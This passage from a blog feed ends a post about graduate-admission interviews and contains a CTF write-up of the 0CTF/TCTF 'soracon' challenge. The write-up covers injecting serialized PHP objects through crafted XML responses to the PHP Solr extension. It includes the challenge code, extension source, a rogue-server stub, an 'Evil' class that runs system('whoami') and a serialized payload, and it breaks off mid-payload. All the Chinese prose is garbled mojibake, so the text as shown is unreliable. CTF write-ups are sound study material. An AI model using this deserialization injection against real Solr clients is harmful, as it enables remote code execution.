ä¼˜å…ˆçº§æå‰æˆ–ä¸å˜ï¼Œå¹¶ä¸ä¼šè¯´å°±ç›´æ¥ä¸ç»™æœºä¼šã€‚</p><p>ç¬¬äºŒå¤©å¬å®£è®²ï¼Œå› ä¸ºå¯¹ä¸œå—ä¸äº†è§£å°±å¬äº†å…¨ç¨‹ã€‚ç»“æœå¬åˆ°ç»“æŸéƒ½æ²¡å‘ç°ä¸€ä¸ªåšæ¼æ´æŒ–æ˜çš„è€å¸ˆã€‚æœ€åæ™šä¸Šå¡«æ„å‘å¯¼å¸ˆæ—¶åªå¥½å¡«äº†ç ”ç©¶çœ‹èµ·æ¥æ¯”è¾ƒé WEBæ–¹å‘çš„è€å¸ˆã€‚é‚£ä½è€å¸ˆè¿˜æ˜¯æœ¬ç§‘æ ¡å‹ï¼Œåæ¥ç¡•å£«å»äº†ä¸Šäº¤ï¼Œtqllll.</p><p>ç¬¬äºŒå¤©ä¸­åˆå¾®ä¿¡è§†é¢‘é¢è¯•ï¼Œè€å¸ˆæ„å¤–åœ°é—®çš„å®‰å…¨ä¸“ä¸šæ€§è¿˜å¯ä»¥ï¼Œè¯´æ˜ä¸æ˜¯åšcsçš„ã€‚åŸºæœ¬æ˜¯åˆšæ‹¿åˆ°ç®€å†ï¼Œç„¶åå¯¹ç€ç®€å†é—®ï¼Œæœ€åé¢äº†20å¤šåˆ†é’Ÿå§</p><ul><li><p>å…ˆè‡ªæˆ‘ä»‹ç»ä¸‹</p></li><li><p>çˆ¬è™«æœ‰ä»€ä¹ˆç»•è¿‡åçˆ¬æœºåˆ¶çš„</p></li></ul><p>å› ä¸ºç®€å†å†™äº†ç”¨puppeteerå†™çˆ¬è™«ï¼Œè¿™ä¸€å—å°±çˆ¬è™«èŠäº†ä¸€ä¼šï¼Œä¹Ÿä¸æ­¢è¿™ä¸€ä¸ªé—®é¢˜ã€‚æˆ‘ä¸»è¦å°±æåˆ°äº†ä»£ç†æ± ç»•ip.ä¸è¿‡åé¢è€å¸ˆåˆé—®éªŒè¯ç é‚£äº›æ€ä¹ˆåŠï¼ŒåŒ…æ‹¬å¦‚æœéœ€è¦æ³¨å†Œè´¦å·æ€ä¹ˆåŠã€‚æˆ‘è¡¨ç¤ºå¦‚æœæ˜¯æ‹–åŠ¨çš„å¯èƒ½è¿˜æœ‰åŠæ³•ï¼Œå‰©ä¸‹çš„é‚£ç§ç”¨jsåŠä¸åˆ°çš„ä¼°è®¡åªèƒ½OCRäº†ï¼Œä¸ç„¶è‚¯å®šç»•ä¸è¿‡å»ã€‚ä½†æ˜¯å› ä¸ºè¿™äº›æ–¹æ³•æˆ‘è‡ªå·±å®é™…å†™çš„æ—¶å€™å¹¶æ²¡æœ‰ç”¨åˆ°ï¼Œæ‰€ä»¥è§£é‡Šäº†ä¸‹æˆ‘åŸºæœ¬å°±æ˜¯ç›´æ¥ç”¨æˆ‘ç°æˆç™»å½•å¥½çš„cookieçˆ¬è‡ªå·±æœ‰è´¦å·çš„ç«™ã€‚</p><ul><li>æ‰“CTFé¢å¯¹ä¸€ä¸ªç½‘ç«™æ€ä¹ˆæ‰¾æ´æ€ä¹ˆåˆ©ç”¨çš„</li></ul><p>è§£é‡Šä¸‹å¸¸è§„å‡ æ¿æ–§ã€‚ä½†æˆ‘å¯èƒ½æ²¡æœ‰ç­”å…¨è‡ªå·±å¹³æ—¶çš„æ€è·¯ã€‚åŸºæœ¬å°±å…ˆçœ‹ç¯å¢ƒï¼Œåˆ¤æ–­è¯­è¨€ï¼Œåˆ¤æ–­æœåŠ¡ç‰ˆæœ¬ï¼Œæœ‰æºç çœ‹æºç ï¼Œæ²¡æœ‰çš„è¯æ‰¾ç°æˆå¯¹åº”ç‰ˆæœ¬æœ‰æ— åˆ©ç”¨â€¦â€¦</p><ul><li>cobaltstrike / msfç”¨è¿‡å—ï¼Œè¯»è¿‡æºç å—</li></ul><p>è¿™é‡Œæˆ‘ç¡®å®æƒŠäº†ï¼Œå› ä¸ºæ²¡æƒ³åˆ°è€å¸ˆä¼šåšè¿™ä¸ªç›¸å…³çš„å†…å®¹ã€‚æˆ‘å°±è¯´è‡ªå·±ä¸»è¦åšä»£ç å®¡è®¡ä¸æ€ä¹ˆæ¸—é€æ‰€ä»¥åªç”¨è¿‡ç®€å•çš„ç”Ÿæˆpayloadä¹‹ç±»çš„æ²¡æœ‰çœ‹è¿‡æºç ã€‚</p><p>ç„¶åå°±å¼€å¯å’µå¤©æ¨¡å¼ï¼Œè€å¸ˆè®²è¯´ä»–è¿™è¾¹åšåæ¸—é€ä¸€äº›çš„æ¯”è¾ƒå¤šï¼ŒåŒ…æ‹¬ä¸€äº›æ—¥å¿—åˆ†æä¹‹ç±»çš„ã€‚æˆ‘ä¹Ÿè¡¨ç¤ºæˆ‘æ¯”è¾ƒåå‘åšçº¢é˜Ÿçš„ï¼Œæ›´æƒ³åšæ¼æ´æŒ–æ˜è·Ÿä»£ç å®¡è®¡ã€‚ä¸è¿‡è€å¸ˆè¿™é‡Œæ„æ€å€’æ˜¯è¯´ä½ åšçº¢é˜Ÿçš„ä¹Ÿä¼šæœ‰å¸®åŠ©ï¼Œä¸¤è€…éƒ½æœ‰å¯æå‡çš„åœ°æ–¹233.</p><ul><li>æœ‰æ²¡æœ‰å…¶ä»–offerï¼Œå¦‚æœæˆ‘ç»™ä½ offerä½ æ€ä¹ˆé€‰</li></ul><p>ä¸ºäº†ä¸å½±å“è€å¸ˆæ‹›ç”Ÿå®è¯å®è¯´æ¯”è¾ƒå¥½ï¼Œæˆ‘å°±è€è€å®å®è¯´æœ‰ä¿¡å·¥æ‰€ä¼˜è¥ï¼Œå¯èƒ½æ›´åå‘ä¿¡å·¥æ‰€å› ä¸ºä»–ä»¬é‚£è¾¹æ–¹å‘æˆ‘æ›´å–œæ¬¢å§ã€‚æœ€åèŠäº†ä¸‹è€å¸ˆè¯´ä»–è¿˜æ˜¯è¡¨ç¤ºæ¬¢è¿çš„ï¼Œæˆ‘ä¹Ÿè¡¨ç¤ºè‡ªå·±ä¼šä»”ç»†è€ƒè™‘ä¸‹ã€‚è¿™é‡ŒåŸºæœ¬ä¸ŠçŸ¥é“ç¨³äº†ã€‚</p><p>æœ€åç»“æœå‡ºæ¥ç¡®å®ç»™äº†å­¦ç¡•offerã€‚è€å¸ˆäººçœŸçš„æŒºä¸é”™çš„ã€‚</p><p>ä¸œå—æ•´ä½“æŠ¥åç”Ÿæºæœ‰ç‚¹åå‘æ±Ÿè‹ï¼Œçœ‹åˆ°å¥½å¤šæœ¬æ ¡ä»¥åŠæ²³æµ·è¿™æ ·çš„ã€‚å¯¹äºæƒ³211å‡985çš„åº”è¯¥ç®—é«˜æ€§ä»·æ¯”çš„æœºä¼šã€‚ä¸è¿‡ç›®æµ‹ç½‘å®‰é™¢å› ä¸ºæ˜¯å…¨å›½ç¬¬ä¸€æ‰¹ç½‘å®‰å­¦é™¢ï¼Œå¯¼è‡´çœŸæ­£åšå®‰å…¨çš„è¿˜ä¸å¤šã€‚è²Œä¼¼çœŸæ­£æå®‰å…¨çš„åœ¨è®¡ç®—æœºé™¢é‚£è¾¹ã€‚éš¾åº¦ä¸Šè‡ªç„¶æ¯”è®¡ç®—æœºè½»æ¾å¾ˆå¤šã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ€åæ€»ç»“ä¸‹ã€‚</p><p> æ•´ä¸ªå¤ä»¤è¥æµç¨‹ä¸‹æ¥ï¼Œæ„Ÿè§‰å¯¹äºæˆ‘ä¸ªäººè€Œè¨€ï¼Œæœ€éš¾çš„è¿˜æ˜¯å…¥è¥ã€‚å› ä¸ºå¯¹äºæ¸…åŒ—åäº”è¿™ç§å¾ˆå¤šäººçš„æ¢¦æ ¡æ¥è¯´ï¼Œè‡ªèº«æ¡ä»¶å†æ€ä¹ˆå¥½ä¹Ÿå¾ˆéš¾è·Ÿå…¶ä»–æ‰å †çš„985/211çš„top3å¤§ä½¬ç›¸æ¯”ï¼Œé™¤éæŠ¥ç›´åšã€‚ä½†æ˜¯å‡å¦‚ä½ åƒæˆ‘ä¸€æ ·å¹¶ä¸æƒ³é•¿æœŸåšç§‘ç ”ï¼ŒåŒæ—¶å¯¹è¿™äº›åæ ¡çš„åšå£«æ¯•ä¸šé£é™©æ„Ÿåˆ°æ‹…å¿§ï¼Œåªæ˜¯æƒ³ç ”ç©¶ç”Ÿé˜¶æ®µèƒ½åšç‚¹å®åœ¨çš„å®‰å…¨ï¼Œç„¶åç¡•å£«æ¯•ä¸šå…¥èŒçš„ï¼Œæˆ‘å¹¶ä¸å»ºè®®ç›´åšã€‚æ¯•ç«Ÿè¿™äº›é™¢æ ¡çš„åšå£«æ¯•ä¸šå‹åŠ›æ˜¯ä¸å°çš„ï¼Œç”šè‡³åƒæŸæ ¡å¯¹ç¡•å£«å°±æœ‰å˜ç›¸å‹æ¦¨+å»¶æ¯•è­¦å‘Š(æˆ‘åªæ˜¯éšä¾¿è¯´è¯´XDã€‚å®¡æ ¸çš„è€å¸ˆå¾€å¾€ä¹Ÿä¸ä¼šåœ¨æ„ä½ çš„ç«èµ›ç»å†ã€‚æ‰€ä»¥æˆ‘çš„ä¼˜åŠ¿åªå‰©ä¸‹GPAæ’åã€‚GPAæ’åå¤Ÿç¡¬çš„è¯(éƒ¨åˆ†æŒ‡top3,éƒ¨åˆ†æŒ‡top1)ï¼Œé™¤å¼€ä¸Šè¿°é™¢æ ¡ä»¥åŠéƒ¨åˆ†æœ‰åŒéæ­§è§†çš„ï¼Œå…¥è¥é—®é¢˜åº”è¯¥ä¸å¤§ã€‚</p><p> ç„¶åå°±æ˜¯é¢è¯•éš¾åº¦ã€‚å¯¹äºç½‘å®‰ä¸“ä¸šçš„åŒå­¦è€Œè¨€ï¼Œctfç»å†ç»å¯¹ç®—æ˜¯å·¨å¤§ä¼˜åŠ¿äº†ï¼Œå› ä¸ºä¸€èˆ¬ä½ çš„åŠ¨æ‰‹èƒ½åŠ›è·Ÿå­¦ä¹ èƒ½åŠ›éƒ½æœ‰ä¿éšœï¼Œä¸ä¼šè¯´åˆ°è€å¸ˆé‚£å¹²æ´»ç»“æœé…ä¸ªç¯å¢ƒé…ä¸€ä¸ªæ˜ŸæœŸéƒ½å¼„ä¸å¥½2333ã€‚å¦‚æœä½ è¢«é—®åˆ°ç›¸å…³ç»å†çš„è¯ï¼Œä¹Ÿå¯ä»¥è®²äº›ä»¤äººå°è±¡æ·±åˆ»çš„trickã€‚</p><p> é¢è¯•å†…å®¹ä¸Šï¼Œæˆ‘ä¸ªäººé¢çš„ä¸¤æ‰€éƒ½æ˜¯ç®€å†ç›¸å…³ã€‚è€å¸ˆä¸»è¦å…³æ³¨çš„è¿˜æ˜¯ä½ ç®€å†ä¸Šç§‘ç ”é¡¹ç›®çš„é‚£ä¸€å—ã€‚æˆ‘ä¸ªäºº0ç§‘ç ”0é¡¹ç›®ï¼Œä½†æ˜¯å½“åˆçœ‹åˆ°å‰è¾ˆåˆ†äº«ç»éªŒæ—¶éƒ½è¯´è‚¯å®šä¼šè¢«é—®é¡¹ç›®ç›¸å…³ï¼Œæ‰€ä»¥å°±æŠŠæˆ‘githubä¸Šçš„é¡¹ç›®ä»¥åŠä¸“ä¸šæ€§ä¸ç›¸å…³çš„ç§‘ç ”ç»å†å†™ä¸Šå»äº†ã€‚äº‹å®ä¸Šï¼Œè€å¸ˆä»¬ä¹Ÿä¸ä¼šç‰¹åˆ«careä½ çš„é¡¹ç›®æ€ä¹ˆæ ·ï¼Œä¸»è¦åœ¨äºä½ è‡ªå·±åšäº†è¿™ä¸ªé¡¹ç›®ï¼Œå¯¹å®ƒå¾ˆäº†è§£ï¼Œèƒ½å¨“å¨“é“æ¥è€Œä¸æ˜¯æ”¯æ”¯å¾å¾çš„ã€‚ä¸ç„¶ä¸€çœ¼å°±èƒ½çœ‹å‡ºæºäº†æ°´åˆ†ã€‚</p><p> æ€»çš„æ¥è¯´ä¿ç ”çš„äº‹åŸºæœ¬å°±å¿«åˆ°å°¾å£°äº†ã€‚ç»“æœä¸Šæ¥è®²ï¼Œå¾—æ‰¿è®¤è‡ªå·±ä¸ç®—ç‰¹åˆ«æ»¡æ„ï¼Œä½†æ˜¯æ¯•ç«Ÿæœ‰äº›æ²Ÿå£‘ä¸æ˜¯é åŠªåŠ›å°±èƒ½è·¨è¶Šçš„ã€‚å°½äººäº‹å¬å¤©å‘½å°±å¥½ã€‚ä¸‹é¢è¿˜è¦åˆ©ç”¨å¥½æ—¶é—´æå‡æŠ€æœ¯ï¼Œåšäº›ç ”ç©¶äº†ã€‚ä¹‹å‰æœ¬æ¥ä¸æ˜¯å¾ˆé‡è§†çš„RCTFæ”¶è·äº†æ„å¤–çš„å¥½æˆç»©ï¼Œå¸Œæœ›åé¢è¿˜èƒ½è·ŸX1cç»§ç»­å†²å†²å†²ï¼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0ctf/tctf-soracon</title>
      <link href="2021/07/07/0ctf-tctf-soracon/"/>
      <url>2021/07/07/0ctf-tctf-soracon/</url>
      
        <content type="html"><![CDATA[<p>  è¿™æ¬¡0ctf/tctf æŠ½ç©ºçœ‹äº†ä¸‹soraconè¿™é¢˜ã€‚æœ€ç»ˆè¿˜æ˜¯éå¸¸å¯æƒœï¼Œå¯èƒ½æœ‰å¤šç‚¹æ—¶é—´åšé¢˜å°±èƒ½è§£å‡ºäº†ã€‚ä¸‹é¢æ˜¯è‡ªå·±çš„ä¸€ä¸ªæ€è·¯æµç¨‹ã€‚</p><a id="more"></a><p>ï¼ˆä»€ä¹ˆæ—¶å€™æ‰èƒ½åšå‡ºzsxçš„é¢˜å‘¢</p><h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><p>é¢˜ç›®ç»™å‡ºäº†æºç </p><pre><code class="c">&lt;?phphighlight_file(__FILE__);$host = $_GET[&#39;host&#39;] ?? &#39;127.0.0.1&#39;;$options = [&#39;hostname&#39; =&gt; $host, &#39;port&#39; =&gt; 8983, &#39;path&#39; =&gt; &#39;/solr&#39;];$client = new SolrClient($options);$query = new SolrQuery();$query-&gt;setQuery(&#39;lucene&#39;);$query_response = $client-&gt;query($query);$response = $query_response-&gt;getResponse();print_r($response);</code></pre><p>è¿™é‡Œç”¨åˆ°çš„<code>SolrClient</code>ç­‰ç­‰ç±»è¯´æ˜ç”¨åˆ°äº†php çš„solræ‰©å±•ã€‚ä¸€èˆ¬æ˜¯ç›´æ¥peclå®‰è£…å³å¯ï¼Œæˆ‘æ˜¯windowsç¯å¢ƒæ‰€ä»¥å°±ç›´æ¥ä¸Š<a href="https://pecl.php.net/package/solr" target="_blank" rel="noopener">pecl</a> ä¸‹ä¸€ä»½æºç ï¼Œä¸‹ä¸€ä»½ç¼–è¯‘å¥½çš„dllã€‚</p><p>è¿™é‡ŒåŸæœ¬æ˜¯æ‰“ç®—è‡ªå·±ç¼–è¯‘ä¸€ä»½dllçœ‹çœ‹è¦ä¸è¦åŠ¨æ€è°ƒè¯•çš„ã€‚ä½†æ˜¯å®é™…ä¸Šæ¼æ´ç‚¹å¯ä»¥ç›´æ¥é™æ€çœ‹å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘å°±æ²¡æœ‰å¦å¤–ç¼–è¯‘äº†ã€‚</p><p>å…³äºsolrè‡ªå·±å…¶å®ä»¥å‰æ²¡æœ‰çœ‹è¿‡ç›¸å…³æ¼æ´ï¼Œæ‰€ä»¥å»æ–°å®‰è£…äº†ä¸‹ï¼Œæœ¬åœ°å¯ä»¥ç›´æ¥<code>solr start -e cloud</code>èµ·ã€‚</p><p>è¿™é‡Œè™½ç„¶ä¸èƒ½ç›´æ¥çœ‹æ‡‚é¢˜ç›®æºç çš„å…·ä½“ç›®çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œå¯æ§ç‚¹åªæœ‰hostã€‚ä¹Ÿå°±æ˜¯è¯´response æ˜¯å¯æ§çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬ä»response å…¥æ‰‹</p><p>æˆ‘ä»¬ç›´æ¥æ‰¾getResponse,å‘ç°èµ·è°ƒç”¨çš„æ˜¯æ¥å£solr_response_get_response_impl</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_54f1252f9274090714abfcbafac53b3e.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_54f1252f9274090714abfcbafac53b3e.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œçš„php_var_unserializeä»£è¡¨ï¼Œè¿™é‡Œå¯¹responseæ‰§è¡Œäº†ååºåˆ—åŒ–ã€‚è¾“å…¥æ˜¯ç¬¬äºŒä¸ªå‚æ•°raw_responseã€‚è¿™ä¸ªå°±éå¸¸æœ‰æ„æ€äº†ã€‚æˆ‘ä»¬çš„responseä½œä¸ºå¯æ§å‚æ•°çš„è¯ï¼Œå¦‚æœèƒ½åˆ©ç”¨ååºåˆ—åŒ–å¿…ç„¶æ˜¯å¯ä»¥æ‰©å¤§æ”»å‡»é¢ã€‚é‚£ä¹ˆå›æº¯çœ‹ä¸‹è¿™é‡Œçš„å‚æ•°raw_response èƒ½å¦æ§åˆ¶ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ååºåˆ—åŒ–ã€‚</p><p>é¦–å…ˆï¼Œå¯ä»¥å‘ç°ï¼Œraw_response æ¥è‡ªbufferã€‚<code>raw_resp = (unsigned char *) buffer.str;</code><br>è€Œbufferåˆ™æ˜¯æ ¹æ®ifæ¡ä»¶ï¼Œæœ‰å¤šç§ä¸åŒæ–¹å¼å¤„ç†å¾—åˆ°çš„</p><pre><code class="c">if (Z_STRLEN_P(response_writer)){    if (0 == strcmp(Z_STRVAL_P(response_writer), SOLR_XML_RESPONSE_WRITER))    {        /* SOLR_XML_RESPONSE_WRITER */        /* Convert from XML serialization to PHP serialization format */        solr_encode_generic_xml_response(&amp;buffer, Z_STRVAL_P(raw_response), Z_STRLEN_P(raw_response), Z_LVAL_P(parser_mode));        if(return_array)        {            solr_sobject_to_sarray(&amp;buffer);        }    } else if (0 == strcmp(Z_STRVAL_P(response_writer), SOLR_PHP_NATIVE_RESPONSE_WRITER) || 0 == strcmp(Z_STRVAL_P(response_writer), SOLR_PHP_SERIALIZED_RESPONSE_WRITER)) {        /* SOLR_PHP_NATIVE_RESPONSE_WRITER */        /* Response string is already in Native PHP serialization format */        solr_string_set(&amp;buffer, Z_STRVAL_P(raw_response), Z_STRLEN_P(raw_response));        if(!return_array)        {            solr_sarray_to_sobject(&amp;buffer);        }    } else if (0 == strcmp(Z_STRVAL_P(response_writer), SOLR_JSON_RESPONSE_WRITER)) {        int json_translation_result = solr_json_to_php_native(&amp;buffer, Z_STRVAL_P(raw_response), Z_STRLEN_P(raw_response));        /* SOLR_JSON_RESPONSE_WRITER */        /* Convert from JSON serialization to PHP serialization format */        if (json_translation_result &gt; 0)        {            solr_throw_exception_ex(solr_ce_SolrException, SOLR_ERROR_1000, SOLR_FILE_LINE_FUNC, solr_get_json_error_msg(json_translation_result));            php_error_docref(NULL, E_WARNING, &quot;Error in JSON-&gt;PHP conversion. JSON Error Code %d&quot;, json_translation_result);        }        if(!return_array)        {            solr_sarray_to_sobject(&amp;buffer);        }    }}</code></pre><p>ä½†æ˜¯å…¶å®æ­¤å¤„æˆ‘ä»¬å¯ä»¥æ ¹æ®æœ¬åœ°æŠ¥é”™ï¼Œç›´æ¥ç¡®å®šå°±æ˜¯ç¬¬ä¸€ä¸ªifã€‚æ¯”å¦‚æˆ‘è¿œç¨‹èµ·äº†ä¸€ä¸ªnodeä½œä¸ºhttp server</p><pre><code class="javascript">const express = require(&#39;express&#39;);const app = express();const logger = require(&#39;morgan&#39;);app.use(logger(&#39;dev&#39;))app.post(&#39;/solr/*&#39;, (req, res) =&gt; res.send(&#39;233&#39;));app.listen(8983)</code></pre><p>å›æ˜¾<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_bfd8b68993d160d3bae4ac59b4df2145.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_bfd8b68993d160d3bae4ac59b4df2145.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä»error loading root of xmlåŸºæœ¬å¯ä»¥ç¡®å®šï¼ŒæœŸæœ›çš„å›æ˜¾è‚¯å®šæ˜¯xmlæ ¼å¼ã€‚è€Œä¸”åç»­çš„error unserializing ä¹ŸåŸºæœ¬ç¡®å®šå…¶ä¸­ä¼šå‘ç”Ÿååºåˆ—åŒ–ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬è·Ÿè¿›ç¬¬ä¸€ä¸ªifä¸­çš„<code>solr_encode_generic_xml_response</code></p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_6957d2e03fa4a9bbb9a1229b41e707a7.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_6957d2e03fa4a9bbb9a1229b41e707a7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å‘ç°æœ‰æˆ‘ä»¬åˆšåˆšçš„æŠ¥é”™ä¿¡æ¯ã€‚å¯ä»¥ç¡®è®¤æ˜¯è¿™ä¸ªåˆ†æ”¯äº†ã€‚æ¥ä¸‹æ¥è·Ÿè¿›<code>solr_encode_object</code><br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_37173b270a270d0f6dfe37c3668196ac.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_37173b270a270d0f6dfe37c3668196ac.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œä¸å¦¨çœ‹ä¸‹<code>solr_write_object_opener</code><br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_4f95c27cf8a0fe9f2568b6ed16360277.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_4f95c27cf8a0fe9f2568b6ed16360277.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å…¶å®æ¼æ´ç‚¹åˆ°è¿™é‡Œå°±æœ‰é›å½¢äº†ã€‚æ­¤å¤„openerè¿™ä¸ªå‡½æ•°æ˜æ˜¾æ˜¯åœ¨å¾€bufferé‡Œå†™åºåˆ—åŒ–æ•°æ®å­—ç¬¦ä¸²ã€‚å®é™…ä¸Šï¼Œä¸Šé¢çš„<code>encode_xml_node</code>ä»¥åŠ<code>object_closer</code>è·Ÿè¿›å»ä¹Ÿä¼šå‘ç°ï¼Œæ˜¯ä¸€æ ·çš„æ€è·¯ã€‚</p><p>æ—¢ç„¶ä»–çš„åºåˆ—åŒ–æ•°æ®æ˜¯ä¸€æ®µæ®µæ‹¼æ¥è€Œæˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„å¯æ§æ•°æ®è‡ªç„¶ä¹Ÿä½œä¸ºå…¶ä¸­ä¸€éƒ¨åˆ†è¢«æ‹¼æ¥è¿›å»äº†ï¼Œæœ€åæ‰§è¡Œååºåˆ—åŒ–ã€‚ç„¶è€Œæˆ‘ä»¬çŸ¥é“ï¼Œphpä¸­åºåˆ—åŒ–æ•°æ®åªè¦æ»¡è¶³æ­£ç¡®æ ¼å¼é—­åˆå…³ç³»ï¼Œæ˜¯å¯ä»¥é€šè¿‡æå‰é—­åˆæ¥å®ç°ååºåˆ—åŒ–é€ƒé€¸çš„ã€‚è¿™ä¸ªä¸å¿…å¤šè¯´ã€‚</p><p>è¿™é‡Œåé¢ä¹Ÿå¯ä»¥è·Ÿä¸‹solr_encode_xml_node.ä¹Ÿä¼šå‘ç°å…¶å®å°±æ˜¯åœ¨æ ¹æ®xml nodeçš„ç±»å‹æ¥é€‰æ‹©ä¸åŒå‡½æ•°ï¼š</p><pre><code class="c">#define solr_encode_xml_node(__node, __buf, __enc_type, __arr_idx, __mode) solr_encoder_functions[solr_get_xml_type((__node))]((__node),(__buf), (__enc_type), (__arr_idx), (__mode))......static solr_php_encode_func_t solr_encoder_functions[] = {    solr_encode_string,    solr_encode_null,    solr_encode_bool,    solr_encode_int,    solr_encode_float,    solr_encode_string,    solr_encode_array,    solr_encode_object,    solr_encode_document,    solr_encode_result,    NULL};......static inline int solr_get_xml_type(xmlNode *node){    solr_char_t *node_name = (solr_char_t *) node-&gt;name;    if (!node_name)    {        return SOLR_ENCODE_STRING;    }    if (!strcmp(node_name, &quot;str&quot;)) {        return SOLR_ENCODE_STRING;    } ......</code></pre><p>æ¥ä¸‹æ¥æœ¬åœ°æ¨¡æ‹Ÿä¸‹ã€‚é¦–å…ˆphpä»£ç é€‰é¡¹åŠ ä¸Šproxy,æŠ“åŒ…çœ‹ä¸‹å›æ˜¾(è¿™é‡Œsolrå·²ç»æ–°å»ºäº†ä¸€ä¸ªcore bycäº†)</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_cdd12cc646c1357437639f914c869267.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_cdd12cc646c1357437639f914c869267.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;response&gt;&lt;lst name=&quot;responseHeader&quot;&gt;  &lt;bool name=&quot;zkConnected&quot;&gt;true&lt;/bool&gt;  &lt;int name=&quot;status&quot;&gt;0&lt;/int&gt;  &lt;int name=&quot;QTime&quot;&gt;12&lt;/int&gt;  &lt;lst name=&quot;params&quot;&gt;    &lt;str name=&quot;q&quot;&gt;lucene&lt;/str&gt;    &lt;str name=&quot;indent&quot;&gt;on&lt;/str&gt;    &lt;str name=&quot;version&quot;&gt;2.2&lt;/str&gt;    &lt;str name=&quot;wt&quot;&gt;xml&lt;/str&gt;  &lt;/lst&gt;&lt;/lst&gt;&lt;result name=&quot;response&quot; numFound=&quot;0&quot; start=&quot;0&quot; maxScore=&quot;0.0&quot; numFoundExact=&quot;true&quot;&gt;&lt;/result&gt;&lt;/response&gt;</code></pre><p>æ„Ÿè§‰è·Ÿè¿œç¨‹å·®çš„æœ‰ç‚¹å¤šã€‚ä½†æ˜¯æ ¼å¼æ˜¯æ¸…æ™°çš„ã€‚æ¯”å¦‚ç±»å‹ï¼Œåå­—éƒ½å¯ä»¥å¯¹åº”ã€‚æˆ‘ä»¬æŒ‰ç…§è¿™ä¸ªï¼Œä»¥åŠè¿œç¨‹çš„å›æ˜¾æ ¼å¼å…¶å®å°±å¯ä»¥æ„é€ ä¸€ä¸ªresponseäº†ã€‚</p><p>æœ¬åœ°æµ‹è¯•ï¼Œå‡†å¤‡ä¸€ä¸ªæ¶æ„ç±»Evilã€‚destructé‡Œæ”¾ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚</p><pre><code class="php">class Evil {    public function __destruct() {        system(&quot;whoami&quot;);    }}</code></pre><p>å›æ˜¾è®¾ç½®é‡Œæ’å…¥æ¶æ„åºåˆ—åŒ–æ•°æ®<code>O:4:&quot;Evil&quot;:0:{}</code>ã€‚ç„¶ååé¢é—­åˆ5ä¸ªæ‹¬å·ï¼Œè¿™ä¸ªæ˜¯ç›´æ¥fuzzå‡ºæ¥çš„ã€‚</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;response&gt;&lt;result name=&quot;response&quot; 